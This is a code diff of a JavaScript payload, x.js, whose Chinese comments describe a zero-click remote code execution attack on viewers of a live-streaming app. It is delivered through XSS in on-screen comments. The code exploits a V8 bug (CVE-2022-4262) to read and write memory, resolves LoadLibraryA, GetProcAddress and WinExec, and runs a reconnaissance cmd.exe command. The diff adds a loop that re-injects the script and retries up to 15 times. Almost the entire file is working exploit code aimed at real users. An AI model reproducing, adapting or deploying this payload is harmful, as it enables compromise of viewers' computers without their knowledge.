@@ -1,12 +1,25 @@
 
-/* ================= x.js —— 观众 0-click RCE payload =================
-   由弹幕 XSS 加载执行（<script src=...>），运行在直播姬 CEF 渲染进程内。
+/* ================= x.js —— 观众 0-click RCE payload（自加载重试版）=================
+   由弹幕 XSS 加载执行；触发是概率性的，失败则用 <script> 重新加载自己（带 ?r=N）重试。
    CVE-2022-4262 → 任意读写 → LoadLibraryA/GetProcAddress → WinExec
    条件：不需要任何 flag、不写代码页（CEF 默认配置）
-   ==================================================================== */
+   ================================================================================= */
 (function(){
+var MAX_RETRY = 15;
+var selfUrl = null;
+try { selfUrl = (document.currentScript && document.currentScript.src) || null; } catch(e){}
+function selfRetry(n){
+  try {
+    if (!selfUrl) return;
+    if (n > MAX_RETRY) { window.__rce="gave up after "+MAX_RETRY; return; }
+    var base = selfUrl.split("?")[0];
+    var s = document.createElement("script");
+    s.src = base + "?r=" + n + "&t=" + Date.now();
+    (document.head||document.documentElement).appendChild(s);
+  } catch(e){}
+}
 try{
-  /* ---------- 触发前：准备 buffer / wasm（顺序不能改，影响触发成功率）---------- */
+  /* ---------- 触发前：准备 buffer / wasm（顺序不能改）---------- */
   var CMDSTR = "cmd.exe /c whoami> C:/Windows/Temp/wh.txt & ipconfig /all> C:/Windows/Temp/ip.txt & ver> C:/Windows/Temp/ver.txt";
   var cmdAB=new ArrayBuffer(0x200), nameAB=new ArrayBuffer(0x40), dllAB=new ArrayBuffer(0x40);
   var rw_ab=new ArrayBuffer(0x20000), rw_ta=new BigUint64Array(rw_ab);
@@ -26,7 +39,7 @@ try{
    var s2=leb(bd.length+2);m.push(0x0a);for(var q=0;q<s2.length;q++)m.push(s2[q]);m.push(0x01);var s3=leb(bd.length);for(var q=0;q<s3.length;q++)m.push(s3[q]);
    for(var q=0;q<bd.length;q++)m.push(bd[q]);
    return new Uint8Array(m);}
-  /* ---------- ① 触发 CVE-2022-4262（★ 必须在利用之前）---------- */
+  /* ---------- ① 触发 CVE-2022-4262 ---------- */
 // Exploit for CVE-2022-4262
 // author: @mistymntncop
 // based on the ITW exploit (author unknown) found by @_clem1
@@ -286,31 +299,36 @@ corrupted_obj = null;
 
 //*/
 
-  /* ---------- ② 利用 ---------- */
-  var g_inst=new WebAssembly.Instance(new WebAssembly.Module(buildRouteB(12,0x7e)),{env:{imp:function(){return 0x4321n;}}});
-  var fnA=addr_of(document.createElement);
-  var sfi=v8_read64(fnA+0x0Cn)&0xFFFFFFFFn;
-  var fti=v8_read64(sfi+0x04n)&0xFFFFFFFFn;
-  var cc =v8_read64(fti+0x18n)&0xFFFFFFFFn;
-  var cb =v8_read64(cc +0x08n);
-  var base=cb-0x825C020n;                       // libcef 基址（锚点回调偏移固定）
-  var IAT=base+0xA3C8598n;
-  var f=addr_of(rw_ta)+0x2Cn;
-  v8_write64(f, IAT-0x400n);                    // 只读 2 个 IAT 值（读多了会让笼内写失效）
-  var off=0x400;
-  var LLA=rw_ta[(off+248*8)>>3];
-  var GPA=rw_ta[(off+153*8)>>3];
-  var IFT0=v8_read64(addr_of(g_inst)+0x30n);
-  v8_write64(f, IFT0);
-  var dllP=v8_read64(addr_of(dllAB)+0x1Cn);
-  var nameP=v8_read64(addr_of(nameAB)+0x1Cn);
-  var cmdP=v8_read64(addr_of(cmdAB)+0x1Cn);
-  rw_ta[0]=LLA;
-  var kb=BigInt.asUintN(64,BigInt(g_inst.exports.pwn(0n,0n,dllP,0n,0n,0n,0n,0n,0n,0n,0n,0n)));
-  rw_ta[0]=GPA;
-  var we=BigInt.asUintN(64,BigInt(g_inst.exports.pwn(0n,nameP,kb,0n,0n,0n,0n,0n,0n,0n,0n,0n)));
-  rw_ta[0]=we;
-  var r=BigInt.asUintN(64,BigInt(g_inst.exports.pwn(0n,5n,cmdP,0n,0n,0n,0n,0n,0n,0n,0n,0n)));
-  window.__rce = "ret=0x"+r.toString(16)+" trigger="+String(large_arr_addr)+" base=0x"+base.toString(16)+" we=0x"+we.toString(16);
+  /* ---------- ② 利用（只有触发成功才做）---------- */
+  if (large_arr_addr === 0 || large_arr_addr === undefined) {
+    window.__rce = "trigger failed (attempt)";
+    selfRetry((parseInt((selfUrl||"").replace(/.*[?&]r=(\d+).*/,"$1"),10)||0) + 1);
+  } else {
+    var g_inst=new WebAssembly.Instance(new WebAssembly.Module(buildRouteB(12,0x7e)),{env:{imp:function(){return 0x4321n;}}});
+    var fnA=addr_of(document.createElement);
+    var sfi=v8_read64(fnA+0x0Cn)&0xFFFFFFFFn;
+    var fti=v8_read64(sfi+0x04n)&0xFFFFFFFFn;
+    var cc =v8_read64(fti+0x18n)&0xFFFFFFFFn;
+    var cb =v8_read64(cc +0x08n);
+    var base=cb-0x825C020n;
+    var IAT=base+0xA3C8598n;
+    var f=addr_of(rw_ta)+0x2Cn;
+    v8_write64(f, IAT-0x400n);
+    var off=0x400;
+    var LLA=rw_ta[(off+248*8)>>3];
+    var GPA=rw_ta[(off+153*8)>>3];
+    var IFT0=v8_read64(addr_of(g_inst)+0x30n);
+    v8_write64(f, IFT0);
+    var dllP=v8_read64(addr_of(dllAB)+0x1Cn);
+    var nameP=v8_read64(addr_of(nameAB)+0x1Cn);
+    var cmdP=v8_read64(addr_of(cmdAB)+0x1Cn);
+    rw_ta[0]=LLA;
+    var kb=BigInt.asUintN(64,BigInt(g_inst.exports.pwn(0n,0n,dllP,0n,0n,0n,0n,0n,0n,0n,0n,0n)));
+    rw_ta[0]=GPA;
+    var we=BigInt.asUintN(64,BigInt(g_inst.exports.pwn(0n,nameP,kb,0n,0n,0n,0n,0n,0n,0n,0n,0n)));
+    rw_ta[0]=we;
+    var r=BigInt.asUintN(64,BigInt(g_inst.exports.pwn(0n,5n,cmdP,0n,0n,0n,0n,0n,0n,0n,0n,0n)));
+    window.__rce="OK ret=0x"+r.toString(16)+" trigger="+String(large_arr_addr)+" base=0x"+base.toString(16)+" we=0x"+we.toString(16);
+  }
 }catch(e){ window.__rce="ERR:"+e.message; }
 })();
